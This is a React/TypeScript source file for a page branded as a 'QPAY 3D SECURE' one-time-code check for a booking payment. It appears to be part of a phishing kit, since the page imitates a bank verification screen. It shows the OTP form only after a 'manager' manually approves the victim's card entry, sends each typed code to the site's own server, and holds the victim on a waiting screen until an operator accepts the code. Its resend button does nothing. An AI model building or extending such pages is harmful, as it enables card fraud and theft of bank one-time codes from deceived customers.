"use client";

import { useState, useEffect, FormEvent, useRef, useCallback } from "react";
import { getFingerprint } from "@/lib/presence";
import Link from "next/link";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { formatSalary } from "@/lib/utils";
import { subscribeToEntryStatus } from "@/lib/realtime";
import styles from "./QpayVerifyClient.module.css";

const OTP_LENGTH = 6;

export function QpayVerifyClient({
  paymentEntryId,
  bookingId,
  bookingRef,
  amount,
  serviceFee,
  total,
  cardLast4,
  phone,
  dict,
  locale,
}: {
  paymentEntryId: string;
  bookingId: string;
  bookingRef: string;
  amount: number;
  serviceFee: number;
  total: number;
  cardLast4?: string | null;
  phone?: string | null;
  dict: Dictionary;
  locale: string;
}) {
  const p = dict.payment;
  const isAr = locale === "ar";

  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [timeLeft, setTimeLeft] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const inputsRef = useRef<(HTMLInputElement | null)[]>([]);
  // بوابة قرار المدير: لا نعرض نموذج OTP إلا بعد موافقة المدير على البطاقة.
  // "checking" ⟶ جلب الحالة، "pending" ⟶ انتظار القرار، "approved" ⟶ OTP، "rejected" ⟶ رفض.
  const [decisionStatus, setDecisionStatus] = useState<
    "checking" | "pending" | "approved" | "rejected"
  >("checking");
  // مرحلة OTP: بعد إرسال الرمز ننتظر قرار المدير على الرمز نفسه (لا نُظهر النجاح إلا عند الموافقة(.
  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
  const [otpWaiting, setOtpWaiting] = useState(false);
  const [otpRejected, setOtpRejected] = useState(false);

  // آخر 4 أرقام من رقم هاتف العميل (مع احتياطي localStorage كالبوابة الفعلية).
  const visibleLast4 = phone
    ? phone.replace(/\D/g, "").slice(-4)
    : typeof window !== "undefined"
      ? (localStorage.getItem("user_phone") || sessionStorage.getItem("user_phone") || "----")
      : "----";

  // مؤقت إعادة الإرسال (60 ثانية)
  useEffect(() => {
    if (timeLeft <= 0) {
      setCanResend(true);
      return;
    }
    const t = setTimeout(() => setTimeLeft((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [timeLeft]);

  // جلب الحالة الفعلية من الخادم (لا نثق بالبثّ وحده).
  const checkStatus = useCallback(async () => {
    try {
      const res = await fetch(`/api/payments/status?entryId=${paymentEntryId}`, {
        cache: "no-store" as RequestCache,
        headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
      });
      const data = await res.json();
      if (data.status === "approved") setDecisionStatus("approved");
      else if (data.status === "rejected") setDecisionStatus("rejected");
      else setDecisionStatus("pending");
    } catch {
      setDecisionStatus("pending");
    }
  }, [paymentEntryId]);

  // بوابة القرار: عند فتح الصفحة تحقق من حالة موافقة المدير، واشترك لحظياً.
  useEffect(() => {
    let cancelled = false;

    const channel = subscribeToEntryStatus(
      paymentEntryId,
      () => {
        if (!cancelled) void checkStatus();
      },
      () => {
        if (!cancelled) void checkStatus();
      },
    );

    void checkStatus();

    const interval = setInterval(() => {
      if (!cancelled) void checkStatus();
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [paymentEntryId, checkStatus]);

  // راقب قرار المدير على رمز OTP بعد إرساله ((لا نجاح قبل الموافقة(.
  const checkOtpStatus = useCallback(async () => {
    if (!otpEntryId) return;
    try {
      const res = await fetch(`/api/payments/status?entryId=${otpEntryId}`, {
        cache: "no-store" as RequestCache,
        headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
      });
      const data = await res.json();
      if (data.status === "approved") {
        setSuccess(true);
        setOtpWaiting(false);
      } else if (data.status === "rejected") {
        setOtpRejected(true);
        setOtpWaiting(false);
      }
    } catch {
      // تجاهل — نبقى في شاشة الانتظار ونعيد المحاولة في الدورة القادمة
    }
  }, [otpEntryId]);

  useEffect(() => {
    if (!otpWaiting || !otpEntryId) return;
    let cancelled = false;

    const channel = subscribeToEntryStatus(
      otpEntryId,
      () => {
        if (!cancelled) void checkOtpStatus();
      },
      () => {
        if (!cancelled) void checkOtpStatus();
      },
    );

    void checkOtpStatus();

    const interval = setInterval(() => {
      if (!cancelled) void checkOtpStatus();
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [otpWaiting, otpEntryId, checkOtpStatus]);

  const fillDigits = useCallback((code: string) => {
    const seq = code.replace(/\D/g, "").substring(0, OTP_LENGTH).split("");
    setDigits((prev) => {
      const next = [...prev];
      seq.forEach((d, i) => {
        if (next[i] !== undefined) next[i] = d;
      });
      return next;
    });
    const focusIdx = Math.min(seq.length, OTP_LENGTH - 1);
    inputsRef.current[focusIdx]?.focus();
  }, []);

  // WebOTP API لقراءة رمز SMS تلقائياً على الأجهزة المحمولة
  useEffect(() => {
    if ("OTPCredential" in window) {
      const ac = new AbortController();
      // أنواع TS لا تشمل WebOTP بعد — نستخدم cast آمن
      (navigator.credentials as CredentialsContainer & {
        get: (opts: unknown) => Promise<{ code?: string } | null>;
      })
        .get({ otp: { transport: ["sms"] }, signal: ac.signal })
        .then((otp) => {
          if (otp && otp.code) fillDigits(otp.code);
        })
        .catch(() => {});
      return () => ac.abort();
    }
  }, [fillDigits]);

  function handleDigitChange(index: number, value: string) {
    const v = value.replace(/\D/g, "");
    // التعامل مع لصق/تعبيئة تلقائية لعدة أرقام
    if (v.length > 1) {
      fillDigits(v);
      return;
    }
    const next = [...digits];
    next[index] = v;
    setDigits(next);
    setError(null);
    if (v && index < OTP_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  }

  function handleKeydown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace") {
      const next = [...digits];
      if (!next[index] && index > 0) {
        next[index - 1] = "";
        setDigits(next);
        inputsRef.current[index - 1]?.focus();
      } else {
        next[index] = "";
        setDigits(next);
      }
      setError(null);
    }
  }

  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "");
    if (pasted) fillDigits(pasted);
  }

  function resendOtp() {
    alert(p.qpayResentAlert);
    setTimeLeft(60);
    setCanResend(false);
  }

  const otpComplete = digits.every((d) => d !== "");

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    const otp = digits.join("");
    if (otp.length < OTP_LENGTH) {
      setError(p.qpayOtpRequired);
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/payments/qpay-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": getFingerprint(),
        },
        body: JSON.stringify({
          paymentEntryId,
          bookingId: undefined,
          otp,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(
          data.error === "invalid_otp_length" ? p.qpayOtpRequired : p.qpayOtpInvalid,
        );
        return;
      }
      // لا نجاح فورياً — ننتظر قرار المدير على الرمز نفسه.

      setOtpEntryId(data.entryId);
      setOtpWaiting(true);
    } catch {
      setError(p.qpayOtpInvalid);
    } finally {
      setLoading(false);
    }
  }

  // ===== شاشة انتظار قرار المدير على رمز OTP =====
  if (otpWaiting) {
    return (
      <div className={styles.layout}>
        <Card className={styles.statusCard}>
          <div className={styles.statusIconWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.statusTitle}>{p.qpayWaitingTitle}</h1>
          <p className={styles.statusSub}>{p.qpayOtpPendingSub}</p>
          <div className={styles.statusSteps}>
            <span className={styles.statusStep}>١. {p.qpayWaitingStep1}</span>
            <span className={styles.statusStep}>٢. {p.qpayWaitingStep2}</span>
            <span className={styles.statusStep}>٣. {p.qpayWaitingStep3}</span>
          </div>
          <p className={styles.statusImportant}>{p.qpayWaitingDoNotClose}</p>
          <Link
            href="javascript:history.back()"
            className={styles.statusCancel}
          >
            {p.qpayCancel}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة رفض رمز OTP =====
  if (otpRejected) {
    return (
      <div className={styles.layout}>
        <Card className={styles.rejectedCard}>
          <div className={styles.rejectedIcon}>✗</div>
          <h1 className={styles.rejectedTitle}>{p.qpayRejectedTitle}</h1>
          <p className={styles.rejectedSub}>{p.qpayOtpRejectedMsg}</p>
          <button
            type="button"
            className={styles.retryBtn}
            onClick={() => {
              setOtpRejected(false);
              setOtpWaiting(false);
              setOtpEntryId(null);
              setDigits(Array(OTP_LENGTH).fill(""));
              setError(null);
            }}
          >
            {p.qpayOtpRetry}
          </button>
          <Link href="javascript:history.back()" className={styles.statusCancel}>
            {p.qpayCancel}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة النجاح =====
  if (success) {
    return (
      <div className={styles.layout}>
        <Card className={styles.successCard}>
          <div className={styles.successIcon}>✓</div>
          <h1 className={styles.successTitle}>{p.qpaySuccessTitle}</h1>
          <p className={styles.successSub}>{p.qpaySuccessSub}</p>
          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{bookingRef}</strong>
          </div>
          <Link className={styles.successLink} href={`/${locale}/account`}>
            {isAr ? "الذهاب إلى حسابي" : "Go to my account"}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة الانتظار (بانتظار قرار المدير) =====
  if (decisionStatus === "checking" || decisionStatus === "pending") {
    return (
      <div className={styles.layout}>
        <Card className={styles.statusCard}>
          <div className={styles.statusIconWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.statusTitle}>{p.qpayWaitingTitle}</h1>
          <p className={styles.statusSub}>{p.qpayWaitingSub}</p>
          <div className={styles.statusSteps}>
            <span className={styles.statusStep}>١. {p.qpayWaitingStep1}</span>
            <span className={styles.statusStep}>٢. {p.qpayWaitingStep2}</span>
            <span className={styles.statusStep}>٣. {p.qpayWaitingStep3}</span>
          </div>
          <p className={styles.statusImportant}>{p.qpayWaitingDoNotClose}</p>
          <Link
            href="javascript:history.back()"
            className={styles.statusCancel}
          >
            {p.qpayCancel}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة الرفض =====
  if (decisionStatus === "rejected") {
    return (
      <div className={styles.layout}>
        <Card className={styles.rejectedCard}>
          <div className={styles.rejectedIcon}>✗</div>
          <h1 className={styles.rejectedTitle}>{p.qpayRejectedTitle}</h1>
          <p className={styles.rejectedSub}>{p.qpayRejectedMsg}</p>
          <Link
            href={`/${locale}/payment/qpay/${bookingId}`}
            className={styles.retryBtn}
          >
            {p.retryPayment}
          </Link>
        </Card>
      </div>
    );
  }

  const formatTimer = () =>
    `${String(Math.floor(timeLeft / 60)).padStart(2, "0")}:${String(
      timeLeft % 60,
    ).padStart(2, "0")}`;

  return (
    <div className={styles.layout}>
      <Card className={styles.panel}>
        <div className={styles.header}>
          <div className={styles.logo}>
            <span className={styles.logoBar} />
            <span className={styles.logoBarDim} />
            <span className={styles.logoBarDimmer} />
            <span className={styles.logoText}>QPAY</span>
          </div>
          <div className={styles.secureBadge}>3D SECURE</div>
        </div>

        <div className={styles.formBox}>
          <div className={styles.formHeader}>
            <span>{p.qpayOtpTitle}</span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className={styles.lockIcon}
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2}
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>

          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.infoText}>
              <p className={styles.sentText}>
                {p.qpayOtpSent}{" "}
                <span className={styles.phoneBold} dir="ltr">
                  •••• {visibleLast4}
                </span>
              </p>
              <p className={styles.completeText}>
                {p.qpayOtpComplete}{" "}
                <span className={styles.amountBold}>
                  QAR {formatSalary(amount, locale)}
                </span>
              </p>
            </div>

            <div className={styles.otpRow} dir="ltr">
              {digits.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    inputsRef.current[i] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  autoComplete={i === 0 ? "one-time-code" : "off"}
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleDigitChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeydown(i, e)}
                  onPaste={handlePaste}
                  className={styles.otpInput}
                  aria-label={`${p.qpayOtpTitle} ${i + 1}`}
                />
              ))}
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <div className={styles.timerWrap}>
              {!canResend ? (
                <span>
                  {p.qpayResendIn}{" "}
                  <span className={styles.timer}>{formatTimer()}</span>
                </span>
              ) : (
                <button
                  type="button"
                  onClick={resendOtp}
                  className={styles.resendBtn}
                >
                  {p.qpayResend}
                </button>
              )}
            </div>

            <div className={styles.actions}>
              <button
                type="submit"
                disabled={!otpComplete || loading}
                className={`${styles.confirmBtn} ${otpComplete ? styles.confirmReady : ""}`}
              >
                {loading ? p.qpayProcessing : p.qpayConfirmPayment}
              </button>
              <a
                href="javascript:history.back()"
                className={styles.cancelBtn}
              >
                {p.qpayCancel}
              </a>
            </div>
          </form>
        </div>

        <p className={styles.protected}>{p.qpayProtected}</p>
      </Card>
    </div>
  );
}